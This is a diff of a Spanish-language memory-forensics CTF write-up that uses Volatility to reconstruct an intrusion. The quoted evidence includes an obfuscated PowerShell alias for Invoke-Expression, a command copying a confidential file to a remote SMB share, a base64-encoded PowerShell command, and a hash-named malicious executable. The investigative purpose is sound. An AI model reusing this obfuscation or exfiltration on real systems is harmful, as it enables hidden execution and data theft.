@@ -1,5 +1,5 @@
 
-## 1 y 2 - ¿Cuál es el sistema operativo de la máquina? y ¿Cuándo se creó el volcado de memoria?
+## 1 y 2) ¿Cuál es el sistema operativo de la máquina? y ¿Cuándo se creó el volcado de memoria?
 ### Vol3
 
 ```bash
@@ -71,7 +71,7 @@ python2 vol.py -f ../recollection.bin imageinfo
 ```
 
 
-## 3 - Después de que el atacante obtuviera acceso al equipo, copió un comando PowerShell ofuscado al portapapeles. ¿Cuál era el comando?
+## 3) Después de que el atacante obtuviera acceso al equipo, copió un comando PowerShell ofuscado al portapapeles. ¿Cuál era el comando?
 
 ### Vol2
 
@@ -90,13 +90,13 @@ Session    WindowStation Format                         Handle Object           
 
 - **Respuesta:** `(gv '*MDR*').naMe[3,11,2]-joIN''`
 
-## 4 - El atacante copió el comando ofuscado para utilizarlo como alias de un cmdlet de PowerShell. ¿Cuál es el nombre del cmdlet?
+## 4) El atacante copió el comando ofuscado para utilizarlo como alias de un cmdlet de PowerShell. ¿Cuál es el nombre del cmdlet?
 
 [Securonix Threat Research Knowledge Sharing Series: Hiding the PowerShell Execution Flow - Securonix](https://www.securonix.com/blog/hiding-the-powershell-execution-flow/)
 
 **Respuesta:** Invoke-Expression
 
-## 5 - Se ejecutó un comando CMD para intentar extraer un archivo. ¿Cuál es la línea de comando completa?
+## 5) Se ejecutó un comando CMD para intentar extraer un archivo. ¿Cuál es la línea de comando completa?
 
 ### Vol2
 
@@ -272,7 +272,7 @@ PS C:\Users\user>
 
 **Respuesta:** `type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`
 
-## 6 - Tras ejecutar el comando anterior, ¿nos puede indicar si el archivo se ha filtrado correctamente?
+## 6) Tras ejecutar el comando anterior, ¿nos puede indicar si el archivo se ha filtrado correctamente?
 
 ```powershell
 ...
@@ -283,7 +283,7 @@ The network path was not found.
 ```
 **Respuesta:** No
 
-## 7 - El atacante intentó crear un archivo readme. ¿Cuál era la ruta completa del archivo?
+## 7) El atacante intentó crear un archivo readme. ¿Cuál era la ruta completa del archivo?
 
 ```
 PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"      
@@ -297,31 +297,35 @@ echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"%
 
 **Respuesta:** `C:\Users\Public\Office\readme.txt`
 
-## 8 - ¿Cuál era el nombre de host del equipo?
+## 8) ¿Cuál era el nombre de host del equipo?
 
 ```powershell
+...
 PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''                                                                      
 iex                                                                                                                     
 PS C:\Users\user> net users                                                                                             
                                                                                                                         
-User accounts for \\USER-PC           
+User accounts for \\USER-PC       
+...    
 ```
 
 **Respuesta:** `USER-PC `
 
-## 9 - ¿Cuántas cuentas de usuario había en la máquina?
+## 9) ¿Cuántas cuentas de usuario había en la máquina?
 
 ```powershell
+...
 User accounts for \\USER-PC                                                                                             
                                                                                                                         
 -------------------------------------------------------------------------------                                         
 Administrator            Guest                    user                                                                  
-The command completed successfully.                         
+The command completed successfully.
+...                         
 ```
 
 **Respuesta:** 3
 
-## 10 - En la carpeta «\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge» había algunas subcarpetas en las que se encontraba un archivo llamado passwords.txt. ¿Cuál era la ubicación/ruta completa del archivo?
+## 10) En la carpeta «\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge» había algunas subcarpetas en las que se encontraba un archivo llamado passwords.txt. ¿Cuál era la ubicación/ruta completa del archivo?
 
 ### Vol3 
 
@@ -345,4 +349,14 @@ python2 vol.py --profile Win7SP1x64 -f ../recollection.bin filescan | grep passw
 ```
 
 **Respuesta:**`\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`
+
+## 11) Se ejecutó un archivo malicioso mediante un comando. El nombre del archivo ejecutable EXE era el valor hash del propio archivo. ¿Cuál era el valor hash?
+
+```powershell
+...
+Cmd #3 at 0xc72a0: cd .\Downloads
+Cmd #4 at 0xbdf10: ls
+Cmd #5 at 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
+...
+```
 
